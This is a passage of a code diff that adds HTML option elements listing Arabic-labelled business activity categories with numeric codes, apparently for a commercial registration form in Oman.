+                <div class="activity-option" data-value="969">إعداد مواقع لأعمال التعدين</div>
+                <div class="activity-option" data-value="995">أعمال الأساسات وهياكل الإنشاءات وأعمال الخرسانة ورص الطابوق ووضع الأحجار والسقالات وتغطية السقوف وغيرها</div>
+                <div class="activity-option" data-value="968">أعمال الحفر وردم الأراضي وتسويتها</div>
+                <div class="activity-option" data-value="965">أعمال الموانئ (كاسرات للأمواج ،الحمايات للأرصفة، الحفر، الردم....الخ)</div>
+                <div class="activity-option" data-value="991">أعمال تنفيذ التصميم الداخلي (التجصيص والطلاء والتزيين)</div>
+                <div class="activity-option" data-value="961">إقامة وإصلاح محطات الطاقة الكهربائية والمحولات ومحطات الاتصالات السلكية واللاسلكية والرادار</div>
+                <div class="activity-option" data-value="1363">الإرشاد البحري</div>
+                <div class="activity-option" data-value="44">الاستزراع السمكي البحري</div>
+                <div class="activity-option" data-value="48">الاستزراع السمكي في المياه العذبة</div>
+                <div class="activity-option" data-value="1531">الإستشارات الإدارية</div>
+                <div class="activity-option" data-value="1527">الاستشارات المالية</div>
+                <div class="activity-option" data-value="1126">الأسواق المركزية وما شابهها</div>
+                <div class="activity-option" data-value="1786">الأندية الرياضية</div>
+                <div class="activity-option" data-value="1828">الأندية الصحية (مساج ،حمام بخاري ....إلخ)</div>
+                <div class="activity-option" data-value="1341">الإنقاذ البحري</div>
+                <div class="activity-option" data-value="1392">البارات</div>
+                <div class="activity-option" data-value="1423">البث التلفزيوني عن طريق الشبكة المعلوماتية (الإنترنت)</div>
+                <div class="activity-option" data-value="1501">البحث و تقديم المشورة المتعلقة بالاستثمار في الأوراق المدرجة</div>
+                <div class="activity-option" data-value="1557">البحث والتطوير التجريبي في مجال العلوم الاجتماعية والإنسانية</div>
+                <div class="activity-option" data-value="1554">البحث والتطوير التجريبي في مجالي العلوم الطبيعية والهندسية</div>
+                <div class="activity-option" data-value="1558">البحث والتطوير المتعدد القطاعات، على الأغلب في العلوم الاجتماعية والإنسانية</div>
+                <div class="activity-option" data-value="1128">البرادات</div>
+                <div class="activity-option" data-value="1457">البنوك التجارية</div>
+                <div class="activity-option" data-value="1458">البنوك المتخصصة</div>
+                <div class="activity-option" data-value="1287">البيع الآلي (أجهزة البيع الآلي التي تعمل بقطع النقود)</div>
+                <div class="activity-option" data-value="1250">البيع بالتجزئة في المتاجر المتخصص للمنتجات البلاستيكية والمطاطية واللدائن</div>
+                <div class="activity-option" data-value="1265">البيع بالتجزئة في المتاجر المتخصصة لآلات وأدوات التصوير ولوازمها</div>
+                <div class="activity-option" data-value="1263">البيع بالتجزئة في المتاجر المتخصصة لآلات ومعدات المصانع</div>
+                <div class="activity-option" data-value="1230">البيع بالتجزئة في المتاجر المتخصصة لآلات ومعدات المطابع</div>
+                <div class="activity-option" data-value="1159">البيع بالتجزئة في المتاجر المتخصصة لأجهزة الاتصالات الطرفية</div>
+                <div class="activity-option" data-value="1162">البيع بالتجزئة في المتاجر المتخصصة لأجهزة البث التلفزيوني</div>
+                <div class="activity-option" data-value="1153">البيع بالتجزئة في المتاجر المتخصصة لأجهزة الحاسب الآلي والبرامج غير المعدة كطلب العميل</div>
+                <div class="activity-option" data-value="1231">البيع بالتجزئة في المتاجر المتخصصة لأجهزة القياس والرقابة</div>
+                <div class="activity-option" data-value="1244">البيع بالتجزئة في المتاجر المتخصصة لأجهزة المختبرات الزراعية</div>
+                <div class="activity-option" data-value="1249">البيع بالتجزئة في المتاجر المتخصصة لأجهزة ومعدات ومستلزمات تنقية المياه</div>
+                <div class="activity-option" data-value="1240">البيع بالتجزئة في المتاجر المتخصصة لأدوات الصناعات البترولية</div>
+                <div class="activity-option" data-value="1245">البيع بالتجزئة في المتاجر المتخصصة لأدوات معملية وتعليمية</div>
+                <div class="activity-option" data-value="1228">البيع بالتجزئة في المتاجر المتخصصة لأدوات ومعدات إطفاء الحريق والأمن والسلامة</div>
+                <div class="activity-option" data-value="1272">البيع بالتجزئة في المتاجر المتخصصة لأدوات ومعدات المطارات</div>
+                <div class="activity-option" data-value="1256">البيع بالتجزئة في المتاجر المتخصصة لأدوات ومعدات الموانئ</div>
+                <div class="activity-option" data-value="1239">البيع بالتجزئة في المتاجر المتخصصة لأدوات ومعدات خدمات التموين</div>
+                <div class="activity-option" data-value="1238">البيع بالتجزئة في المتاجر المتخصصة لأدوات ومعدات خدمات الطرق</div>
+                <div class="activity-option" data-value="1264">البيع بالتجزئة في المتاجر المتخصصة لاسطوانات الغاز الفارغة</div>
+                <div class="activity-option" data-value="1156">البيع بالتجزئة في المتاجر المتخصصة لبرامج ومستلزمات الحاسب الآلي</div>
+                <div class="activity-option" data-value="1266">البيع بالتجزئة في المتاجر المتخصصة لبطاقات الأفراح</div>
+                <div class="activity-option" data-value="1237">البيع بالتجزئة في المتاجر المتخصصة لبطاقات خدمات الاتصالات المرخصة في السلطنة</div>
+                <div class="activity-option" data-value="1277">البيع بالتجزئة في المتاجر المتخصصة لبيع الحاويات البترولية والكيميائية</div>
+                <div class="activity-option" data-value="1164">البيع بالتجزئة في المتاجر المتخصصة لتوابع الملابس من خيوط وكلف وما شابه ذلك</div>
+                <div class="activity-option" data-value="1252">البيع بالتجزئة في المتاجر المتخصصة لحاويات سكنية متنقلة (الكرفانات) والبيوت الجاهزة</div>
+                <div class="activity-option" data-value="1175">البيع بالتجزئة في المتاجر المتخصصة لحمامات السباحة الجاهزة</div>
+                <div class="activity-option" data-value="1174">البيع بالتجزئة في المتاجر المتخصصة لخزانات المياه ومستلزماتها</div>
+                <div class="activity-option" data-value="1172">البيع بالتجزئة في المتاجر المتخصصة لسكراب مواد البناء (يشمل تجارة الحديد الخردة)</div>
+                <div class="activity-option" data-value="1248">البيع بالتجزئة في المتاجر المتخصصة لغرف التبريد والبرادات وأبوابها</div>
+                <div class="activity-option" data-value="1207">البيع بالتجزئة في المتاجر المتخصصة لفساتين الأفراح</div>
+                <div class="activity-option" data-value="1259">البيع بالتجزئة في المتاجر المتخصصة لقطع غيار الأجهزة المنزلية (المعدات الكهربائية و الإلكترونية)</div>
+                <div class="activity-option" data-value="1273">البيع بالتجزئة في المتاجر المتخصصة لقطع غيار الطائرات</div>
+                <div class="activity-option" data-value="1193">البيع بالتجزئة في المتاجر المتخصصة لقوارب وأدوات ومعدات الصيد</div>
+                <div class="activity-option" data-value="1267">البيع بالتجزئة في المتاجر المتخصصة لكاميرات المراقبة وأنظمة التحكم عن بعد</div>
+                <div class="activity-option" data-value="1257">البيع بالتجزئة في المتاجر المتخصصة للآلات الزراعية ومضخات ومولدات الكهرباء ولوازمها</div>
+                <div class="activity-option" data-value="1154">البيع بالتجزئة في المتاجر المتخصصة للآلات وأدوات الاستنساخ ولوازمها</div>
+                <div class="activity-option" data-value="1186">البيع بالتجزئة في المتاجر المتخصصة للآلات والأدوات الموسيقية</div>
+                <div class="activity-option" data-value="1255">البيع بالتجزئة في المتاجر المتخصصة للآلات ومعدات التشييد والبناء والهندسة المدنية النفطية والمعدات الثقيلة وصيانتها</div>
+                <div class="activity-option" data-value="1173">البيع بالتجزئة في المتاجر المتخصصة للأبواب والنوافذ</div>
+                <div class="activity-option" data-value="1179">البيع بالتجزئة في المتاجر المتخصصة للأثاث المنزلي</div>
+                <div class="activity-option" data-value="1181">البيع بالتجزئة في المتاجر المتخصصة للأجهزة المنزلية (الثلاجات، معدات المطابخ ... إلخ)</div>
+                <div class="activity-option" data-value="1161">البيع بالتجزئة في المتاجر المتخصصة للأجهزة المنزلية (الراديو، التلفزيوني، جهاز تشغيل اقراص الفيديو الرقمية ..إلخ)</div>
+                <div class="activity-option" data-value="1158">البيع بالتجزئة في المتاجر المتخصصة للأجهزة والمعدات الراديوية</div>
+                <div class="activity-option" data-value="1202">البيع بالتجزئة في المتاجر المتخصصة للأحذية</div>
+                <div class="activity-option" data-value="1168">البيع بالتجزئة في المتاجر المتخصصة للأدوات الصحية وتمديداتها</div>
+                <div class="activity-option" data-value="1169">البيع بالتجزئة في المتاجر المتخصصة للأدوات الكهربائية وتمديداتها</div>
+                <div class="activity-option" data-value="1210">البيع بالتجزئة في المتاجر المتخصصة للأدوات والأجهزة الطبية وأجهزة تقويم الأعضاء</div>
+                <div class="activity-option" data-value="1182">البيع بالتجزئة في المتاجر المتخصصة للأدوات والاواني المنزلية المتنوعة</div>
+                <div class="activity-option" data-value="1192">البيع بالتجزئة في المتاجر المتخصصة للأدوات والملابس الرياضية</div>
+                <div class="activity-option" data-value="1229">البيع بالتجزئة في المتاجر المتخصصة للأدوات والمواد الحربية</div>
+                <div class="activity-option" data-value="1211">البيع بالتجزئة في المتاجر المتخصصة للأدوية البيطرية (تشمل المعدات البيطرية)</div>
+                <div class="activity-option" data-value="1270">البيع بالتجزئة في المتاجر المتخصصة للأسلحة التقليدية</div>
+                <div class="activity-option" data-value="1274">البيع بالتجزئة في المتاجر المتخصصة للأسمدة</div>
+                <div class="activity-option" data-value="1213">البيع بالتجزئة في المتاجر المتخصصة للأعشاب الطبية</div>
+                <div class="activity-option" data-value="1212">البيع بالتجزئة في المتاجر المتخصصة للأعشاب الطبيعية</div>
+                <div class="activity-option" data-value="1247">البيع بالتجزئة في المتاجر المتخصصة للأعلاف الحيوانية</div>
+                <div class="activity-option" data-value="1140">البيع بالتجزئة في المتاجر المتخصصة للأغذية الخاصة والصحية</div>
+                <div class="activity-option" data-value="1260">البيع بالتجزئة في المتاجر المتخصصة للألعاب النارية</div>
+                <div class="activity-option" data-value="1222">البيع بالتجزئة في المتاجر المتخصصة للأنابيب ومستلزماتها</div>
+                <div class="activity-option" data-value="1219">البيع بالتجزئة في المتاجر المتخصصة للبذور</div>
+                <div class="activity-option" data-value="1180">البيع بالتجزئة في المتاجر المتخصصة للبطانيات والشراشف والبياضات</div>
+                <div class="activity-option" data-value="1217">البيع بالتجزئة في المتاجر المتخصصة للتذكارات والتحف واللوحات</div>
+                <div class="activity-option" data-value="1191">البيع بالتجزئة في المتاجر المتخصصة للتسجيلات الموسيقية وتسجيلات الفيديو</div>
+                <div class="activity-option" data-value="1183">البيع بالتجزئة في المتاجر المتخصصة للثريات والنجف والسلع المستخدمة في الإضاءة</div>
+                <div class="activity-option" data-value="1203">البيع بالتجزئة في المتاجر المتخصصة للحقائب والسلع الجلدية وتوابع السفر</div>
+                <div class="activity-option" data-value="1138">البيع بالتجزئة في المتاجر المتخصصة للحلوى العمانية</div>
+                <div class="activity-option" data-value="1224">البيع بالتجزئة في المتاجر المتخصصة للحلي الاصطناعية</div>
+                <div class="activity-option" data-value="1134">البيع بالتجزئة في المتاجر المتخصصة للحوم ومنتجات اللحوم</div>
+                <div class="activity-option" data-value="1165">البيع بالتجزئة في المتاجر المتخصصة للخردة المعدنية وأدوات النجارة والحدادة والألمنيوم</div>
+                <div class="activity-option" data-value="1261">البيع بالتجزئة في المتاجر المتخصصة للخناجر العمانية</div>
+                <div class="activity-option" data-value="1196">البيع بالتجزئة في المتاجر المتخصصة للخيام</div>
+                <div class="activity-option" data-value="1195">البيع بالتجزئة في المتاجر المتخصصة للدراجات الهوائية</div>
+                <div class="activity-option" data-value="1167">البيع بالتجزئة في المتاجر المتخصصة للدهانات والطلاءات</div>
+                <div class="activity-option" data-value="1141">البيع بالتجزئة في المتاجر المتخصصة للدواجن المذبوحة</div>
+                <div class="activity-option" data-value="1214">البيع بالتجزئة في المتاجر المتخصصة للذهب والمجوهرات</div>
+                <div class="activity-option" data-value="1166">البيع بالتجزئة في المتاجر المتخصصة للزجاج</div>
+                <div class="activity-option" data-value="1275">البيع بالتجزئة في المتاجر المتخصصة للزهور والنباتات الصناعية</div>
+                <div class="activity-option" data-value="1218">البيع بالتجزئة في المتاجر المتخصصة للزهور والنباتات الطبيعية</div>
+                <div class="activity-option" data-value="1147">البيع بالتجزئة في المتاجر المتخصصة للزيوت ومشتقاتها</div>
+                <div class="activity-option" data-value="1215">البيع بالتجزئة في المتاجر المتخصصة للساعات بأنواعها</div>
+                <div class="activity-option" data-value="1177">البيع بالتجزئة في المتاجر المتخصصة للستائر والستائر الشبكية</div>
+                <div class="activity-option" data-value="1176">البيع بالتجزئة في المتاجر المتخصصة للسجاد والموكيت</div>
+                <div class="activity-option" data-value="1184">البيع بالتجزئة في المتاجر المتخصصة للصناديق المعدنية والحديدية والخشبية والورقية (الكرتون)</div>
+                <div class="activity-option" data-value="1276">البيع بالتجزئة في المتاجر المتخصصة للطائرات بدون طيار(الدرونز/ المودل)</div>
+                <div class="activity-option" data-value="1258">البيع بالتجزئة في المتاجر المتخصصة للطائرات ومحركاتها</div>
+                <div class="activity-option" data-value="1220">البيع بالتجزئة في المتاجر المتخصصة للطيور والحيوانات الأليفة وأسماك الزينة ومستلزماتها</div>
+                <div class="activity-option" data-value="1206">البيع بالتجزئة في المتاجر المتخصصة للعبايات النسائية والشيل</div>
+                <div class="activity-option" data-value="1139">البيع بالتجزئة في المتاجر المتخصصة للعسل</div>
+                <div class="activity-option" data-value="1254">البيع بالتجزئة في المتاجر المتخصصة للعشب الصناعي</div>
+                <div class="activity-option" data-value="1209">البيع بالتجزئة في المتاجر المتخصصة للعطور ومستحضرات التجميل وصابون الزينة والبخور</div>
+                <div class="activity-option" data-value="1234">البيع بالتجزئة في المتاجر المتخصصة للعوامات والصدادات والمعدات البحرية</div>
+                <div class="activity-option" data-value="1251">البيع بالتجزئة في المتاجر المتخصصة للغازات الطبيعية (الأكسجين)</div>
+                <div class="activity-option" data-value="1223">البيع بالتجزئة في المتاجر المتخصصة للفحم وخشب الوقود</div>
+                <div class="activity-option" data-value="1225">البيع بالتجزئة في المتاجر المتخصصة للفخاريات والمشغولات اليدوية</div>
+                <div class="activity-option" data-value="1236">البيع بالتجزئة في المتاجر المتخصصة للفضيات والهدايا</div>
+                <div class="activity-option" data-value="1132">البيع بالتجزئة في المتاجر المتخصصة للفواكه والخضروات الطازجة والتمور</div>
+                <div class="activity-option" data-value="1188">البيع بالتجزئة في المتاجر المتخصصة للقرطاسية والأدوات المكتبية</div>
+                <div class="activity-option" data-value="1243">البيع بالتجزئة في المتاجر المتخصصة للكابلات الكهربائية والاتصالات</div>
+                <div class="activity-option" data-value="1189">البيع بالتجزئة في المتاجر المتخصصة للكتب الجديدة والصحف والمجلات</div>
+                <div class="activity-option" data-value="1271">البيع بالتجزئة في المتاجر المتخصصة للمبيدات</div>
+                <div class="activity-option" data-value="1143">البيع بالتجزئة في المتاجر المتخصصة للمرطبات والمشروبات (الغازية والساخنة)</div>
+                <div class="activity-option" data-value="1142">البيع بالتجزئة في المتاجر المتخصصة للمشروبات الروحية</div>
+                <div class="activity-option" data-value="1204">البيع بالتجزئة في المتاجر المتخصصة للمصار والكمة العمانية</div>
+                <div class="activity-option" data-value="1137">البيع بالتجزئة في المتاجر المتخصصة للمكسرات والبن والتوابل والعطارة</div>
+                <div class="activity-option" data-value="1201">البيع بالتجزئة في المتاجر المتخصصة للملابس الجاهزة</div>
+                <div class="activity-option" data-value="1268">البيع بالتجزئة في المتاجر المتخصصة للمنتجات الحرفية</div>
+                <div class="activity-option" data-value="1149">البيع بالتجزئة في المتاجر المتخصصة للمنتجات النفطية (لا تشمل الزيوت النفطية ومشتقاتها)</div>
+                <div class="activity-option" data-value="1163">البيع بالتجزئة في المتاجر المتخصصة للمنسوجات والأقمشة بأنواعها</div>
+                <div class="activity-option" data-value="1221">البيع بالتجزئة في المتاجر المتخصصة للمنظفات</div>
+                <div class="activity-option" data-value="1208">البيع بالتجزئة في المتاجر المتخصصة للمواد الصيدلانية (الصيدليات)</div>
+                <div class="activity-option" data-value="1241">البيع بالتجزئة في المتاجر المتخصصة للمواد والمعدات الزراعية</div>
+                <div class="activity-option" data-value="1216">البيع بالتجزئة في المتاجر المتخصصة للنظارات</div>
+                <div class="activity-option" data-value="1157">البيع بالتجزئة في المتاجر المتخصصة للهواتف النقالة ومستلزماتها</div>
+                <div class="activity-option" data-value="1152">البيع بالتجزئة في المتاجر المتخصصة للهواتف ولوازمها</div>
+                <div class="activity-option" data-value="1269">البيع بالتجزئة في المتاجر المتخصصة للوازم المناحل</div>
+                <div class="activity-option" data-value="1187">البيع بالتجزئة في المتاجر المتخصصة للوازم والمعدات المكتبية</div>
+                <div class="activity-option" data-value="1197">البيع بالتجزئة في المتاجر المتخصصة للوازم ومعدات الرحلات</div>
+                <div class="activity-option" data-value="1235">البيع بالتجزئة في المتاجر المتخصصة لماكينات الخياطة</div>
+                <div class="activity-option" data-value="1253">البيع بالتجزئة في المتاجر المتخصصة لمستلزمات الأفراح</div>
+                <div class="activity-option" data-value="1190">البيع بالتجزئة في المتاجر المتخصصة لمستلزمات الخطاطين والرسامين</div>
+                <div class="activity-option" data-value="1194">البيع بالتجزئة في المتاجر المتخصصة لمستلزمات الفروسية</div>
+                <div class="activity-option" data-value="1198">البيع بالتجزئة في المتاجر المتخصصة لمستلزمات الهجن</div>
+                <div class="activity-option" data-value="1185">البيع بالتجزئة في المتاجر المتخصصة لمعدات الفنادق والمطاعم والمطابخ</div>
+                <div class="activity-option" data-value="1232">البيع بالتجزئة في المتاجر المتخصصة لمعدات ضخ المياه</div>
+                <div class="activity-option" data-value="1246">البيع بالتجزئة في المتاجر المتخصصة لمعدات مكافحة تلوث البيئة</div>
+                <div class="activity-option" data-value="1242">البيع بالتجزئة في المتاجر المتخصصة لمعدات وأجهزة الملاحة</div>
+                <div class="activity-option" data-value="1155">البيع بالتجزئة في المتاجر المتخصصة لمعدات وأجهزة سلكية ولاسلكية</div>
+                <div class="activity-option" data-value="1262">البيع بالتجزئة في المتاجر المتخصصة لمعدات وأدوات محلات التجميل</div>
+                <div class="activity-option" data-value="1205">البيع بالتجزئة في المتاجر المتخصصة لملابس وأدوات ولوازم الأطفال</div>
+                <div class="activity-option" data-value="1133">البيع بالتجزئة في المتاجر المتخصصة لمنتجات الألبان والبيض والزيتون والمخللات</div>
+                <div class="activity-option" data-value="1170">البيع بالتجزئة في المتاجر المتخصصة لمنتجات الديكور والأسقف الصناعية والمواد العازلة</div>
+                <div class="activity-option" data-value="1136">البيع بالتجزئة في المتاجر المتخصصة لمنتجات المخابز والحلويات السكرية (لا تشمل المخابز)</div>
+                <div class="activity-option" data-value="1171">البيع بالتجزئة في المتاجر المتخصصة لمواد البناء</div>
+                <div class="activity-option" data-value="1144">البيع بالتجزئة في المتاجر المتخصصة لمياه الشرب (لا يشمل الإنتاج والنقل)</div>
+                <div class="activity-option" data-value="1178">البيع بالتجزئة في المتاجر المتخصصة لورق الحائط وكسوة الأرضيات</div>
+                <div class="activity-option" data-value="1280">البيع بالتجزئة لقطع الغيار المستعملة للأجهزة المنزلية (المعدات الكهربائية و الإلكترونية)</div>
+                <div class="activity-option" data-value="1279">البيع بالتجزئة للأثاث والأجهزة الإلكترونية والكهربائية المستعملة</div>
+                <div class="activity-option" data-value="1281">البيع بالتجزئة للمخلفات البلاستيكية والمطاطية والورقية والمعدنية</div>
+                <div class="activity-option" data-value="1284">البيع بالتجزئة للمواشي والجمال والأغنام</div>
+                <div class="activity-option" data-value="1085">البيع بالجملة لآلات صناعية مثل المناجر والمناشر</div>
+                <div class="activity-option" data-value="1087">البيع بالجملة لآلات ومعدات التشييد والبناء والهندسة المدنية والنفطية والمعدات الثقيلة</div>
+                <div class="activity-option" data-value="1110">البيع بالجملة لأحجار الزينة</div>
+                <div class="activity-option" data-value="1079">البيع بالجملة لأشباه الموصلات</div>
+                <div class="activity-option" data-value="1081">البيع بالجملة لأشرطة وأقراص الصوت والفيديو الفارغة والأقراص المغناطيسية والبصرية</div>
+                <div class="activity-option" data-value="1092">البيع بالجملة لأنواع الوقود السائلة والغازية وما يتصل بها من منتجات</div>
+                <div class="activity-option" data-value="1099">البيع بالجملة لركازات المعادن الحديدية والغير حديدية</div>
+                <div class="activity-option" data-value="1050">البيع بالجملة لزيوت الطعام والدهون النباتية والحيوانية</div>
+                <div class="activity-option" data-value="1100">البيع بالجملة لشرائح ومسحوبات الألمنيوم والحديد وغير الحديد</div>
+                <div class="activity-option" data-value="1047">البيع بالجملة لعلف الحيوانات والدواجن</div>
+                <div class="activity-option" data-value="1088">البيع بالجملة للآلات الحاسبة والإحصائية والكتابية ومعدات المكاتب ولوازمها</div>
+                <div class="activity-option" data-value="1083">البيع بالجملة للآلات والمعدات واللوازم الزراعية</div>
+                <div class="activity-option" data-value="1065">البيع بالجملة للأثاث</div>
+                <div class="activity-option" data-value="1066">البيع بالجملة للأجهزة المنزلية والراديو والتلفزيون ... إلخ</div>
+                <div class="activity-option" data-value="1062">البيع بالجملة للأحذية</div>
+                <div class="activity-option" data-value="1104">البيع بالجملة للأدوات الصحية وتمديداتها وصهاريج المياه</div>
+                <div class="activity-option" data-value="1105">البيع بالجملة للأدوات الكهربائية وتمديداتها بالجملة</div>
+                <div class="activity-option" data-value="1122">البيع بالجملة للأدوات المكتبية والأفلام</div>
+                <div class="activity-option" data-value="1071">البيع بالجملة للأدوات والاواني المنزلية</div>
+                <div class="activity-option" data-value="1107">البيع بالجملة للأسقف الصناعية والمواد العازلة والمصنوعات المعدنية والشبابيك والأبواب ... إلخ</div>
+                <div class="activity-option" data-value="1124">البيع بالجملة للأسلحة والذخائر والمعدات الحربية والرادارات والمسيرات البحرية وملحقاتها</div>
+                <div class="activity-option" data-value="1045">البيع بالجملة للأسماك والحيوانات البحرية</div>
+                <div class="activity-option" data-value="1113">البيع بالجملة للأسمدة ومحسنات التربة الزراعية</div>
+                <div class="activity-option" data-value="1103">البيع بالجملة للإسمنت والجبس والجص</div>
+                <div class="activity-option" data-value="1115">البيع بالجملة للأصباغ والورنيش ومواد التلميع</div>
+                <div class="activity-option" data-value="1058">البيع بالجملة للأقمشة</div>
+                <div class="activity-option" data-value="1073">البيع بالجملة للألعاب واللعب والسلع الرياضية والآلات الموسيقية</div>
+                <div class="activity-option" data-value="1074">البيع بالجملة للبان</div>
+                <div class="activity-option" data-value="1041">البيع بالجملة للبذور والحبوب والفواكه الزيتية والنباتات</div>
+                <div class="activity-option" data-value="1077">البيع بالجملة للبرمجيات</div>
+                <div class="activity-option" data-value="1060">البيع بالجملة للبطانيات والبياضات الجاهزة والشراشف</div>
+                <div class="activity-option" data-value="1044">البيع بالجملة للجلود بكافة أنواعها مدبوغة وغير مدبوغة</div>
+                <div class="activity-option" data-value="1053">البيع بالجملة للحلويات ومنتجات المخابز</div>
+                <div class="activity-option" data-value="1076">البيع بالجملة للحواسيب (الكومبيوتر) ولوازمها</div>
+                <div class="activity-option" data-value="1051">البيع بالجملة للحوم الطازجة والمبردة والمثلجة</div>
+                <div class="activity-option" data-value="1102">البيع بالجملة للخشب بجميع أنواعه</div>
+                <div class="activity-option" data-value="1063">البيع بالجملة للخيام</div>
+                <div class="activity-option" data-value="1043">البيع بالجملة للدواجن الحية</div>
+                <div class="activity-option" data-value="1080">البيع بالجملة للرقائق والدوائر المتكاملة</div>
+                <div class="activity-option" data-value="1054">البيع بالجملة للسجائر والتبغ ومنتجاته</div>
+                <div class="activity-option" data-value="1052">البيع بالجملة للسكر والشاي والقهوة والكاكاو والتوابل والملح</div>
+                <div class="activity-option" data-value="1070">البيع بالجملة للسلع الفوتوغرافية والبصرية والساعات بكافة أنواعها</div>
+                <div class="activity-option" data-value="1116">البيع بالجملة للصابون والمنظفات</div>
+                <div class="activity-option" data-value="1112">البيع بالجملة للصخور والرمال</div>
+                <div class="activity-option" data-value="1078">البيع بالجملة للصمامات والأنابيب الإلكترونية</div>
+                <div class="activity-option" data-value="1106">البيع بالجملة للطابوق والبلاط والرخام</div>
+                <div class="activity-option" data-value="1108">البيع بالجملة للطلاء والدهانات</div>
+                <div class="activity-option" data-value="1072">البيع بالجملة للعطور ومستلزمات التجميل</div>
+                <div class="activity-option" data-value="1096">البيع بالجملة للغاز والنفط الخام ومشتقاته</div>
+                <div class="activity-option" data-value="1048">البيع بالجملة للفواكه والخضروات</div>
+                <div class="activity-option" data-value="1095">البيع بالجملة للقار والاسفلت</div>
+                <div class="activity-option" data-value="1117">البيع بالجملة للكيماويات الصناعية</div>
+                <div class="activity-option" data-value="1042">البيع بالجملة للماشية الحية</div>
+                <div class="activity-option" data-value="1114">البيع بالجملة للمبيدات</div>
+                <div class="activity-option" data-value="1068">البيع بالجملة للمستلزمات الطبية والأدوات والأجهزة الجراحية وأجهزة تقويم الأعضاء</div>
+                <div class="activity-option" data-value="1055">البيع بالجملة للمشروبات الغازية والعصائر والمياه المعدنية</div>
+                <div class="activity-option" data-value="1084">البيع بالجملة للمضخات ومولدات كهرباء ولوازمها</div>
+                <div class="activity-option" data-value="1101">البيع بالجملة للمعادن الحديدية والغير حديدية</div>
+                <div class="activity-option" data-value="1059">البيع بالجملة للملابس الجاهزة وملحقاتها</div>
+                <div class="activity-option" data-value="1075">البيع بالجملة للمنتجات البلاستيكية والمطاطية واللدائن</div>
+                <div class="activity-option" data-value="1067">البيع بالجملة للنجف وأصناف الإضاءة</div>
+                <div class="activity-option" data-value="1119">البيع بالجملة للنظارات</div>
+                <div class="activity-option" data-value="1118">البيع بالجملة للنفايات والخردة والمواد الخاصة بإعادة التدوير</div>
+                <div class="activity-option" data-value="1123">البيع بالجملة للهدايا</div>
+                <div class="activity-option" data-value="1061">البيع بالجملة للوازم الخياطة</div>
+                <div class="activity-option" data-value="1069">البيع بالجملة للورق والورق المقوى والكتب والمجلات والصحف والأدوات المكتبية</div>
+                <div class="activity-option" data-value="1086">البيع بالجملة لماكينات الخياطة</div>
+                <div class="activity-option" data-value="1121">البيع بالجملة لمجوهرات ومصنوعات ومقتنيات ثمينة</div>
+                <div class="activity-option" data-value="1120">البيع بالجملة لمستلزمات عمل اللافتات</div>
+                <div class="activity-option" data-value="1082">البيع بالجملة لمعدات الهاتف والاتصالات</div>
+                <div class="activity-option" data-value="1090">البيع بالجملة لمعدات وأدوات التغليف</div>
+                <div class="activity-option" data-value="1089">البيع بالجملة لمعدات ووسائل تعليمية</div>
+                <div class="activity-option" data-value="1056">البيع بالجملة لمنتجات الأسماك</div>
+                <div class="activity-option" data-value="1049">البيع بالجملة لمنتجات الألبان والبيض</div>
+                <div class="activity-option" data-value="1109">البيع بالجملة لمواد بناء متنوعة</div>
+                <div class="activity-option" data-value="1057">البيع بالجملة لمواد غذائية متنوعة (تشمل المشروبات)</div>
+                <div class="activity-option" data-value="1111">البيع بالجملة لورق الحائط وأغطية الأرضيات</div>
+                <div class="activity-option" data-value="1318">التاكسي المائي</div>
+                <div class="activity-option" data-value="1480">التأمين البحري</div>
+                <div class="activity-option" data-value="1479">التأمين التكافلي الصحي</div>
+                <div class="activity-option" data-value="1478">التأمين التكافلي العائلي</div>
+                <div class="activity-option" data-value="1477">التأمين التكافلي العام</div>
+                <div class="activity-option" data-value="1476">التأمين الصحي</div>
+                <div class="activity-option" data-value="1475">التأمين العام</div>
+                <div class="activity-option" data-value="1482">التأمين ضد الخسائر المالية والديون</div>
+                <div class="activity-option" data-value="1472">التأمين على الحياة</div>
+                <div class="activity-option" data-value="1473">التأمين على العجز</div>
+                <div class="activity-option" data-value="1474">التأمين، بخلاف التأمين على الحياة</div>
+                <div class="activity-option" data-value="1329">التحويل والتفريغ</div>
+                <div class="activity-option" data-value="1323">التخزين المبرد والمجمد</div>
+                <div class="activity-option" data-value="948">التخلص من المخلفات الصناعية</div>
+                <div class="activity-option" data-value="934">التخلص من المخلفات العسكرية</div>
+                <div class="activity-option" data-value="1745">التدريب على الاتكيت</div>
+                <div class="activity-option" data-value="1736">التدريب على الجمباز</div>
+                <div class="activity-option" data-value="996">الترميمات الرئيسية والإضافات</div>
+                <div class="activity-option" data-value="1563">التصميم الصناعي</div>
+                <div class="activity-option" data-value="188">التطريز اليدوي والجاكار</div>
+                <div class="activity-option" data-value="1540">التطوير العقاري</div>
+                <div class="activity-option" data-value="1125">التعاونية الإستهلاكية</div>
+                <div class="activity-option" data-value="67">التعدين واستغلال المحاجر للحصول على الأحجار الكريمة والكوارتز والميكا</div>
+                <div class="activity-option" data-value="66">التعدين واستغلال المحاجر للحصول على الأسفلت والقار والأسفلتيت والحجر الأسفلتي والبيتومين الصلب الطبيعي</div>
+                <div class="activity-option" data-value="1530">التفتيش البيئي</div>
+                <div class="activity-option" data-value="1495">التمويل الهامشي</div>
+                <div class="activity-option" data-value="1129">التموينات</div>
+                <div class="activity-option" data-value="1678">التنظيف العام للمباني</div>
+                <div class="activity-option" data-value="1679">التنظيف المتخصص ودعم المرافق</div>
+                <div class="activity-option" data-value="998">التنظيف بالبخار والسفع بالرمال وغير ذلك من الأنشطة التي تجري على المباني من الخارج</div>
+                <div class="activity-option" data-value="1731">الجامعات</div>
+                <div class="activity-option" data-value="1772">الجمعيات الخيرية</div>
+                <div class="activity-option" data-value="1798">الجمعيات والفرق والنقابات المهنية المختلفة</div>
+                <div class="activity-option" data-value="73">الحفر الاختباري للتعدين</div>
+                <div class="activity-option" data-value="298">الحفر والحفر على الألواح المعدنية أو البلاستيكية (الزنك غراف)</div>
+                <div class="activity-option" data-value="1465">الحفظ والأمانة</div>
+                <div class="activity-option" data-value="1438">الخبرة الاستشارية في مجال المعدات</div>
+                <div class="activity-option" data-value="1444">الخدمات الأمنية المدارة</div>
+                <div class="activity-option" data-value="1452">الخدمات السحابية والاستضافة</div>
+                <div class="activity-option" data-value="69">الخدمات المتصلة باستخراج النفط والغاز باستثناء خدمات المسح</div>
+                <div class="activity-option" data-value="1538">الخدمات المساحية والكمية</div>
+                <div class="activity-option" data-value="1503">الخدمات المصرفية الألكترونية</div>
+                <div class="activity-option" data-value="1350">الخزانات العائمة</div>
+                <div class="activity-option" data-value="1832">السفارات</div>
+                <div class="activity-option" data-value="1370">الشاليهات والاستراحات</div>
